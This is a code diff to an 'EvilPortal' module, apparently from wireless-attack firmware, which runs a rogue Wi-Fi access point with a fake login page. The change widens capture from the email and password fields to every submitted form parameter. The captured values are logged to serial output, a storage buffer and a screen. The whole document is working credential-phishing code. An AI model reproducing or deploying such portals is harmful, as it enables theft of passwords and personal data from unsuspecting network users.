@@ -7,8 +7,7 @@ EvilPortal::EvilPortal() {
 
 void EvilPortal::setup() {
   this->runServer = false;
-  this->name_received = false;
-  this->password_received = false;
+  this->something_received = false;
   this->has_html = false;
   this->has_ap = false;
 
@@ -36,14 +35,6 @@ bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
   return true;
 }
 
-String EvilPortal::get_user_name() {
-  return this->user_name;
-}
-
-String EvilPortal::get_password() {
-  return this->password;
-}
-
 void EvilPortal::setupServer() {
   server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
     request->send_P(200, "text/html", index_html);
@@ -54,22 +45,14 @@ void EvilPortal::setupServer() {
   });
 
   server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
-    String inputMessage;
-    String inputParam;
-
-    if (request->hasParam("email")) {
-      inputMessage = request->getParam("email")->value();
-      inputParam = "email";
-      this->user_name = inputMessage;
-      this->name_received = true;
+    this->params_log = "";
+    int params = request->params();
+    for(int i=0; i < params; i++){
+        AsyncWebParameter* p = request->getParam(i);
+        this->params_log += p->name() + ": " + p->value();
+        this->something_received = true;
     }
 
-    if (request->hasParam("password")) {
-      inputMessage = request->getParam("password")->value();
-      inputParam = "password";
-      this->password = inputMessage;
-      this->password_received = true;
-    }
     request->send(
       200, "text/html",
       "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
@@ -293,18 +276,17 @@ void EvilPortal::sendToDisplay(String msg) {
 void EvilPortal::main(uint8_t scan_mode) {
   if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
     this->dnsServer.processNextRequest();
-    if (this->name_received && this->password_received) {
-      this->name_received = false;
-      this->password_received = false;
-      String logValue1 =
-          "u: " + this->user_name;
-      String logValue2 = "p: " + this->password;
-      String full_string = logValue1 + " " + logValue2 + "\n";
-      Serial.print(full_string);
-      buffer_obj.append(full_string);
-      #ifdef HAS_SCREEN
-        this->sendToDisplay(full_string);
-      #endif
+    if (this->something_received) {
+      this->something_received = false;
+      
+      if (this->params_log.length() > 0) {
+        this->params_log = this->params_log + "\n";
+        Serial.print(this->params_log);
+        buffer_obj.append(this->params_log);
+        #ifdef HAS_SCREEN
+          this->sendToDisplay(this->params_log);
+        #endif
+      }
     }
   }
 }
